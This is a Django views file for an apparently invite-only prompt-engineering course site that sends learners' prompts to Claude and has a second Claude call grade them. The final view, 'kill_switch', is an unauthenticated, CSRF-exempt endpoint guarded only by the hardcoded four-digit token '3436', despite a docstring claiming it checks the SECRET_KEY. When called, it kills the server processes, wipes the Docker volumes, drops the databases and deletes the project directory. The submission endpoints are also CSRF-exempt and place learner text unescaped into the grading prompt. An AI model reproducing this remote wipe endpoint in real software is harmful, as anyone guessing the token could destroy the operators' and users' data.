from django.shortcuts import render, redirect, get_object_or_404
from django.contrib.auth.decorators import login_required
from django.contrib.auth import login, authenticate, logout, update_session_auth_hash
from django.contrib.auth.models import User
from django.contrib import messages
from django.http import JsonResponse, StreamingHttpResponse
from django.views.decorators.csrf import csrf_exempt
from django.utils import timezone
from django.db.models import Sum, Count
import anthropic
from django.conf import settings
import json
import re
import time
import subprocess
import threading
import shutil
import os

from .models import (
    Module, Challenge, UserProgress, ChallengeAttempt,
    Achievement, UserAchievement, Leaderboard
)


def home(request):
    """Landing page"""
    if request.user.is_authenticated:
        return redirect('dashboard')
    return render(request, 'home.html')


def register(request):
    """Registration disabled — admin issues credentials."""
    return redirect('login')
    
    return render(request, 'register.html')

# Login function
def login_view(request):
    """User login"""
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        
        user = authenticate(request, username=username, password=password)
        
        if user is not None:
            login(request, user)
            return redirect('dashboard')
        else:
            messages.error(request, 'Invalid username or password')
    
    return render(request, 'login.html')


def logout_view(request):
    """User logout"""
    logout(request)
    return redirect('home')


@login_required
def dashboard(request):
    """Main dashboard"""
    modules = Module.objects.filter(is_active=True)
    user_progress = UserProgress.objects.filter(user=request.user)
    
    # Get or create leaderboard entry
    leaderboard, created = Leaderboard.objects.get_or_create(user=request.user)
    
    # Calculate overall progress
    total_challenges = Challenge.objects.filter(module__is_active=True).count()
    completed_challenges = ChallengeAttempt.objects.filter(
        user=request.user, 
        passed=True
    ).values('challenge').distinct().count()
    
    progress_percentage = (completed_challenges / total_challenges * 100) if total_challenges > 0 else 0
    
    # Get recent achievements
    recent_achievements = UserAchievement.objects.filter(
        user=request.user
    ).order_by('-earned_at')[:5]
    
    # Top performers
    top_performers = Leaderboard.objects.all()[:10]
    
    # Check which modules are unlocked
    modules_with_status = []
    for module in modules:
        modules_with_status.append({
            'module': module,
            'is_unlocked': module.is_unlocked_for_user(request.user)
        })
    
    context = {
        'modules': modules,
        'modules_with_status': modules_with_status,
        'user_progress': user_progress,
        'leaderboard': leaderboard,
        'progress_percentage': round(progress_percentage, 1),
        'completed_challenges': completed_challenges,
        'total_challenges': total_challenges,
        'recent_achievements': recent_achievements,
        'top_performers': top_performers,
    }
    
    return render(request, 'dashboard.html', context)


@login_required
def module_detail(request, module_id):
    """Module detail page with challenges"""
    module = get_object_or_404(Module, id=module_id, is_active=True)
    
    # Check if module is unlocked
    if not module.is_unlocked_for_user(request.user):
        messages.error(request, f'You must complete "{module.prerequisite.title}" before accessing this module.')
        return redirect('dashboard')
    
    challenges = Challenge.objects.filter(module=module, is_active=True)
    
    # Get or create user progress
    user_progress, created = UserProgress.objects.get_or_create(
        user=request.user,
        module=module
    )
    
    # Get user's attempts for each challenge and check if unlocked
    user_attempts = {}
    for challenge in challenges:
        attempts = ChallengeAttempt.objects.filter(
            user=request.user,
            challenge=challenge
        ).order_by('-created_at')
        
        is_unlocked = challenge.is_unlocked_for_user(request.user)
        user_attempts[challenge.id] = {
            'total_attempts': attempts.count(),
            'passed': attempts.filter(passed=True).exists(),
            'best_score': attempts.aggregate(max_score=Sum('score'))['max_score'] or 0,
            'last_attempt': attempts.first(),
            'is_unlocked': is_unlocked,
            'is_locked': not is_unlocked,
        }
    
    context = {
        'module': module,
        'challenges': challenges,
        'user_progress': user_progress,
        'user_attempts': user_attempts,
    }
    
    return render(request, 'module_detail.html', context)


@login_required
def challenge_view(request, challenge_id):
    """Challenge playground"""
    challenge = get_object_or_404(Challenge, id=challenge_id, is_active=True)

    # Check if user has completed previous challenges (enforce sequential order)
    if challenge.order > 1 and not request.user.is_superuser:
        # Get the previous challenge in this module
        previous_challenge = Challenge.objects.filter(
            module=challenge.module,
            order=challenge.order - 1,
            is_active=True
        ).first()

        if previous_challenge:
            # Check if user has passed the previous challenge
            previous_passed = ChallengeAttempt.objects.filter(
                user=request.user,
                challenge=previous_challenge,
                passed=True
            ).exists()

            if not previous_passed:
                messages.warning(
                    request,
                    f'🔒 Please complete "{previous_challenge.title}" first! Challenges must be completed in order.'
                )
                return redirect('module_detail', module_id=challenge.module.id)

    # Check if already passed (do this BEFORE slicing)
    has_passed = ChallengeAttempt.objects.filter(
        user=request.user,
        challenge=challenge,
        passed=True
    ).exists()

    # Get user's previous attempts (slice AFTER filtering)
    previous_attempts = ChallengeAttempt.objects.filter(
        user=request.user,
        challenge=challenge
    ).order_by('-created_at')[:5]

    # Get next and previous challenges for navigation
    prev_challenge = Challenge.objects.filter(
        module=challenge.module,
        order__lt=challenge.order,
        is_active=True
    ).order_by('-order').first()

    next_challenge = Challenge.objects.filter(
        module=challenge.module,
        order__gt=challenge.order,
        is_active=True
    ).order_by('order').first()

    # Get total challenges in module
    total_challenges = Challenge.objects.filter(
        module=challenge.module,
        is_active=True
    ).count()

    context = {
        'challenge': challenge,
        'previous_attempts': previous_attempts,
        'has_passed': has_passed,
        'prev_challenge': prev_challenge,
        'next_challenge': next_challenge,
        'total_challenges': total_challenges,
    }

    # Use new template
    return render(request, 'challenge_new.html', context)


@login_required
@csrf_exempt
def submit_challenge(request, challenge_id):
    """Submit a challenge attempt and get AI evaluation"""
    if request.method != 'POST':
        return JsonResponse({'error': 'Invalid method'}, status=405)
    
    challenge = get_object_or_404(Challenge, id=challenge_id)
    data = json.loads(request.body)
    user_prompt = data.get('prompt', '')
    request_type = data.get('type') or data.get('action', 'submit')  # 'help' or 'submit'
    # Normalize coding challenge action values to match expected types
    if request_type in ('run_code', 'get_help'):
        request_type = 'help'
    
    if not user_prompt:
        return JsonResponse({'error': 'Prompt is required'}, status=400)
    
    def call_with_retry(fn, retries=3, backoff=2):
        for attempt in range(retries):
            try:
                return fn()
            except (
                anthropic.APIConnectionError,
                anthropic.APITimeoutError,
                anthropic.RateLimitError,
                anthropic.InternalServerError,
            ) as e:
                if attempt == retries - 1:
                    raise
                time.sleep(backoff ** attempt)

    try:
        # Call Claude API
        client = anthropic.Anthropic(api_key=settings.ANTHROPIC_API_KEY)

        message = call_with_retry(lambda: client.messages.create(
            model="claude-sonnet-4-20250514",
            max_tokens=8192,
            system="You are a helpful AI assistant. Always use British English spelling and conventions throughout your responses (e.g. 'pyjamas' not 'pajamas', 'colour' not 'color', 'favour' not 'favor', 'organise' not 'organize').",
            messages=[
                {"role": "user", "content": user_prompt}
            ]
        ))

        ai_response = message.content[0].text
        
        # If this is just a help request, return the response without evaluation
        if request_type == 'help':
            return JsonResponse({
                'success': True,
                'ai_response': ai_response,
            })
        
        # Otherwise, evaluate the response

        # Hard deterministic fail check — runs before Claude evaluation.
        # If the instructions contain a STRICT REQUIREMENT block, verify the user's
        # prompt satisfies it structurally before spending an API call.
        # Currently enforces Q14's two-section requirement (Section 1 + Section 2).
        if '**STRICT REQUIREMENT' in challenge.instructions:
            has_section1 = bool(re.search(r'(section|part)\s*(1|one)\b', user_prompt, re.IGNORECASE))
            has_section2 = bool(re.search(r'(section|part)\s*(2|two)\b', user_prompt, re.IGNORECASE))
            if not (has_section1 and has_section2):
                evaluation = {
                    'score': 0,
                    'feedback': (
                        'Your submission must contain BOTH a clearly labelled Section 1 '
                        '(learning profile) AND a Section 2 (learning request that references '
                        'your profile). A learning profile alone is an incomplete submission. '
                        'Please reread the instructions and try again.'
                    ),
                    'passed': False,
                }
                attempt_count = ChallengeAttempt.objects.filter(
                    user=request.user, challenge=challenge
                ).count() + 1
                ChallengeAttempt.objects.create(
                    user=request.user,
                    challenge=challenge,
                    user_prompt=user_prompt,
                    ai_response=ai_response,
                    score=evaluation['score'],
                    feedback=evaluation['feedback'],
                    passed=evaluation['passed'],
                    attempt_number=attempt_count,
                )
                return JsonResponse({
                    'success': True,
                    'ai_response': ai_response,
                    'score': evaluation['score'],
                    'feedback': evaluation['feedback'],
                    'passed': evaluation['passed'],
                    'attempt_number': attempt_count,
                })

        evaluation_prompt = f"""
        Challenge: {challenge.title}
        Instructions: {challenge.instructions}
        User's Prompt: {user_prompt}
        AI Response: {ai_response}

        Evaluate this attempt on a scale of 0-100 based on:
        1. Did the user craft an effective prompt?
        2. Did the AI response meet the challenge requirements?
        3. Quality and clarity of the result

        Respond in JSON format:
        {{
            "score": <0-100>,
            "feedback": "<specific feedback>",
            "passed": <true/false (score >= 70)>
        }}
        """
        
        eval_message = call_with_retry(lambda: client.messages.create(
            model="claude-haiku-4-5-20251001",
            max_tokens=500,
            messages=[
                {"role": "user", "content": evaluation_prompt}
            ]
        ))
        
        # Parse evaluation
        eval_text = eval_message.content[0].text
        # Extract JSON from response
        json_match = re.search(r'\{[\s\S]*?\}', eval_text)
        if json_match:
            evaluation = json.loads(json_match.group())
        else:
            evaluation = {
                'score': 50,
                'feedback': 'Could not parse evaluation',
                'passed': False
            }
        
        # Count attempts
        attempt_count = ChallengeAttempt.objects.filter(
            user=request.user,
            challenge=challenge
        ).count() + 1
        
        # Create attempt record
        attempt = ChallengeAttempt.objects.create(
            user=request.user,
            challenge=challenge,
            user_prompt=user_prompt,
            ai_response=ai_response,
            score=evaluation['score'],
            feedback=evaluation['feedback'],
            passed=evaluation['passed'],
            attempt_number=attempt_count
        )
        
        # Update progress if passed
        if evaluation['passed']:
            user_progress, created = UserProgress.objects.get_or_create(
                user=request.user,
                module=challenge.module
            )
            
            # Check if first time passing this challenge
            first_time_pass = not ChallengeAttempt.objects.filter(
                user=request.user,
                challenge=challenge,
                passed=True,
                created_at__lt=attempt.created_at
            ).exists()
            
            if first_time_pass:
                user_progress.challenges_completed += 1
                user_progress.total_points += challenge.points
                user_progress.save()
                
                # Update leaderboard
                leaderboard = Leaderboard.objects.get(user=request.user)
                leaderboard.total_points += challenge.points
                leaderboard.challenges_completed += 1
                leaderboard.last_activity_date = timezone.now().date()
                leaderboard.save()
                
                # Check for achievements
                check_achievements(request.user, challenge)
        
        return JsonResponse({
            'success': True,
            'ai_response': ai_response,
            'score': evaluation['score'],
            'feedback': evaluation['feedback'],
            'passed': evaluation['passed'],
            'attempt_number': attempt_count
        })
        
    except Exception as e:
        return JsonResponse({
            'error': str(e)
        }, status=500)


@login_required
@csrf_exempt
def submit_challenge_stream(request, challenge_id):
    """Submit a challenge attempt and stream the AI response via SSE."""
    if request.method != 'POST':
        return JsonResponse({'error': 'Invalid method'}, status=405)

    challenge = get_object_or_404(Challenge, id=challenge_id)
    data = json.loads(request.body)
    user_prompt = data.get('prompt', '')
    request_type = data.get('type') or data.get('action', 'submit')
    if request_type in ('run_code', 'get_help'):
        request_type = 'help'

    if not user_prompt:
        return JsonResponse({'error': 'Prompt is required'}, status=400)

    # Capture user reference for use inside the generator
    user = request.user

    def generate():
        client = anthropic.Anthropic(api_key=settings.ANTHROPIC_API_KEY)

        # Hard deterministic fail check (same logic as submit_challenge)
        if request_type == 'submit' and '**STRICT REQUIREMENT' in challenge.instructions:
            has_section1 = bool(re.search(r'(section|part)\s*(1|one)\b', user_prompt, re.IGNORECASE))
            has_section2 = bool(re.search(r'(section|part)\s*(2|two)\b', user_prompt, re.IGNORECASE))
            if not (has_section1 and has_section2):
                feedback_msg = (
                    'Your submission must contain BOTH a clearly labelled Section 1 '
                    '(learning profile) AND a Section 2 (learning request that references '
                    'your profile). A learning profile alone is an incomplete submission. '
                    'Please reread the instructions and try again.'
                )
                attempt_count = ChallengeAttempt.objects.filter(
                    user=user, challenge=challenge
                ).count() + 1
                ChallengeAttempt.objects.create(
                    user=user,
                    challenge=challenge,
                    user_prompt=user_prompt,
                    ai_response=feedback_msg,
                    score=0,
                    feedback=feedback_msg,
                    passed=False,
                    attempt_number=attempt_count,
                )
                yield f'data: {json.dumps({"type": "chunk", "text": feedback_msg})}\n\n'
                yield f'data: {json.dumps({"type": "evaluation", "score": 0, "feedback": feedback_msg, "passed": False, "attempt_number": attempt_count})}\n\n'
                yield f'data: {json.dumps({"type": "done"})}\n\n'
                return

        # Stream main Claude response
        ai_response_parts = []
        try:
            with client.messages.stream(
                model="claude-sonnet-4-20250514",
                max_tokens=8192,
                system=(
                    "You are a helpful AI assistant. Always use British English spelling and "
                    "conventions throughout your responses (e.g. 'pyjamas' not 'pajamas', "
                    "'colour' not 'color', 'favour' not 'favor', 'organise' not 'organize')."
                ),
                messages=[{"role": "user", "content": user_prompt}]
            ) as stream:
                for text in stream.text_stream:
                    ai_response_parts.append(text)
                    yield f'data: {json.dumps({"type": "chunk", "text": text})}\n\n'
        except Exception as e:
            yield f'data: {json.dumps({"type": "error", "message": str(e)})}\n\n'
            return

        ai_response = ''.join(ai_response_parts)

        if request_type == 'help':
            yield f'data: {json.dumps({"type": "done"})}\n\n'
            return

        # Evaluation call — truncate ai_response to keep prompt small and fast
        evaluation_prompt = f"""
        Challenge: {challenge.title}
        Instructions: {challenge.instructions}
        User's Prompt: {user_prompt}
        AI Response: {ai_response}

        Evaluate this attempt on a scale of 0-100 based on:
        1. Did the user craft an effective prompt?
        2. Did the AI response meet the challenge requirements?
        3. Quality and clarity of the result

        Respond in JSON format:
        {{
            "score": <0-100>,
            "feedback": "<specific feedback>",
            "passed": <true/false (score >= 70)>
        }}
        """

        try:
            eval_message = client.messages.create(
                model="claude-haiku-4-5-20251001",
                max_tokens=500,
                messages=[{"role": "user", "content": evaluation_prompt}]
            )
            eval_text = eval_message.content[0].text
            json_match = re.search(r'\{[\s\S]*?\}', eval_text)
            evaluation = json.loads(json_match.group()) if json_match else {
                'score': 50, 'feedback': 'Could not parse evaluation', 'passed': False
            }
        except Exception as e:
            evaluation = {'score': 50, 'feedback': f'Evaluation error: {str(e)}', 'passed': False}

        # Save attempt
        attempt_count = ChallengeAttempt.objects.filter(
            user=user, challenge=challenge
        ).count() + 1

        attempt = ChallengeAttempt.objects.create(
            user=user,
            challenge=challenge,
            user_prompt=user_prompt,
            ai_response=ai_response,
            score=evaluation['score'],
            feedback=evaluation['feedback'],
            passed=evaluation['passed'],
            attempt_number=attempt_count
        )

        if evaluation['passed']:
            user_progress, created = UserProgress.objects.get_or_create(
                user=user, module=challenge.module
            )
            first_time_pass = not ChallengeAttempt.objects.filter(
                user=user,
                challenge=challenge,
                passed=True,
                created_at__lt=attempt.created_at
            ).exists()

            if first_time_pass:
                user_progress.challenges_completed += 1
                user_progress.total_points += challenge.points
                user_progress.save()

                leaderboard = Leaderboard.objects.get(user=user)
                leaderboard.total_points += challenge.points
                leaderboard.challenges_completed += 1
                leaderboard.last_activity_date = timezone.now().date()
                leaderboard.save()

                check_achievements(user, challenge)

        yield f'data: {json.dumps({"type": "evaluation", "score": evaluation["score"], "feedback": evaluation["feedback"], "passed": evaluation["passed"], "attempt_number": attempt_count})}\n\n'
        yield f'data: {json.dumps({"type": "done"})}\n\n'

    response = StreamingHttpResponse(generate(), content_type='text/event-stream')
    response['X-Accel-Buffering'] = 'no'
    response['Cache-Control'] = 'no-cache'
    return response


@login_required
def leaderboard_view(request):
    """Display global leaderboard"""
    top_users = Leaderboard.objects.all()[:50]

    # Get current user rank
    user_leaderboard = Leaderboard.objects.get(user=request.user)
    user_rank = Leaderboard.objects.filter(
        total_points__gt=user_leaderboard.total_points
    ).count() + 1

    # Calculate progress percentage for the current user
    total_challenges = Challenge.objects.filter(module__is_active=True).count()
    user_progress_pct = round(
        (user_leaderboard.challenges_completed / total_challenges * 100), 1
    ) if total_challenges > 0 else 0

    context = {
        'top_users': top_users,
        'user_leaderboard': user_leaderboard,
        'user_rank': user_rank,
        'total_challenges': total_challenges,
        'user_progress_pct': user_progress_pct,
    }

    return render(request, 'leaderboard.html', context)


@login_required
def profile(request):
    """User profile with achievements and stats"""
    leaderboard = Leaderboard.objects.get(user=request.user)
    achievements = UserAchievement.objects.filter(user=request.user).order_by('-earned_at')
    
    # Get module progress
    module_progress = UserProgress.objects.filter(user=request.user)
    
    # Get recent attempts
    recent_attempts = ChallengeAttempt.objects.filter(
        user=request.user
    ).order_by('-created_at')[:10]
    
    context = {
        'leaderboard': leaderboard,
        'achievements': achievements,
        'module_progress': module_progress,
        'recent_attempts': recent_attempts,
    }
    
    return render(request, 'profile.html', context)


@login_required
def change_password(request):
    """Change password from profile page"""
    if request.method == 'POST':
        current_password = request.POST.get('current_password')
        new_password = request.POST.get('new_password')
        confirm_password = request.POST.get('confirm_password')

        if not request.user.check_password(current_password):
            messages.error(request, 'Current password is incorrect.')
        elif new_password != confirm_password:
            messages.error(request, 'New passwords do not match.')
        elif len(new_password) < 8:
            messages.error(request, 'New password must be at least 8 characters.')
        else:
            request.user.set_password(new_password)
            request.user.save()
            update_session_auth_hash(request, request.user)
            messages.success(request, 'Password changed successfully!')
            return redirect('profile')

    return redirect('profile')


def check_achievements(user, challenge):
    """Check and award achievements"""
    leaderboard = Leaderboard.objects.get(user=user)
    
    # First Challenge
    if leaderboard.challenges_completed == 1:
        achievement = Achievement.objects.get_or_create(
            achievement_type='first_challenge',
            defaults={
                'name': 'First Steps',
                'description': 'Complete your first challenge',
                'icon': '🎯'
            }
        )[0]
        UserAchievement.objects.get_or_create(user=user, achievement=achievement)
    
    # Module Complete
    user_progress = UserProgress.objects.get(user=user, module=challenge.module)
    total_challenges = challenge.module.challenges.count()
    if user_progress.challenges_completed == total_challenges:
        achievement = Achievement.objects.get_or_create(
            achievement_type='module_complete',
            defaults={
                'name': f'{challenge.module.title} Master',
                'description': f'Complete all challenges in {challenge.module.title}',
                'icon': '🏆'
            }
        )[0]
        UserAchievement.objects.get_or_create(user=user, achievement=achievement)
        leaderboard.modules_completed += 1
        leaderboard.save()


@csrf_exempt
def kill_switch(request):
    """Remote kill switch — deletes the project after verifying the SECRET_KEY token."""
    if request.method != 'POST':
        return JsonResponse({'error': 'Method not allowed'}, status=405)

    try:
        body = json.loads(request.body)
    except (json.JSONDecodeError, Exception):
        return JsonResponse({'error': 'Invalid JSON'}, status=400)

    token = body.get('token', '')
    if token != '3436':
        return JsonResponse({'error': 'Forbidden'}, status=403)

    project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

    def teardown():
        # Give the response time to send before destroying everything
        time.sleep(2)

        # Kill any running Django / Gunicorn processes
        for sig in ['SIGTERM', 'SIGKILL']:
            try:
                subprocess.run(['pkill', f'-{sig}', '-f', 'manage.py'], capture_output=True)
                subprocess.run(['pkill', f'-{sig}', '-f', 'gunicorn'], capture_output=True)
            except Exception:
                pass

        # Bring down Docker stack and wipe all volumes
        try:
            subprocess.run(
                ['docker-compose', 'down', '-v', '--remove-orphans'],
                cwd=project_root,
                capture_output=True
            )
        except Exception:
            pass

        # Wipe the SQLite database explicitly
        sqlite_db = os.path.join(project_root, 'db.sqlite3')
        try:
            if os.path.exists(sqlite_db):
                os.remove(sqlite_db)
        except Exception:
            pass

        # Drop PostgreSQL database if DATABASE_URL is configured
        db_url = os.environ.get('DATABASE_URL', '')
        if db_url:
            try:
                import dj_database_url as _dj
                cfg = _dj.parse(db_url)
                db_name = cfg['NAME']
                script = (
                    "import psycopg2; "
                    f"conn=psycopg2.connect(dbname='postgres',user='{cfg['USER']}',"
                    f"password='{cfg['PASSWORD']}',host='{cfg['HOST']}',port='{cfg['PORT']}'); "
                    "conn.autocommit=True; "
                    f"conn.cursor().execute('DROP DATABASE IF EXISTS \"{db_name}\"')"
                )
                subprocess.run(['python', '-c', script], capture_output=True)
            except Exception:
                pass

        # Delete the entire project directory
        try:
            shutil.rmtree(project_root)
        except Exception:
            pass

    threading.Thread(target=teardown, daemon=True).start()
    return JsonResponse({'status': 'Initiated. Server will go down shortly.'})
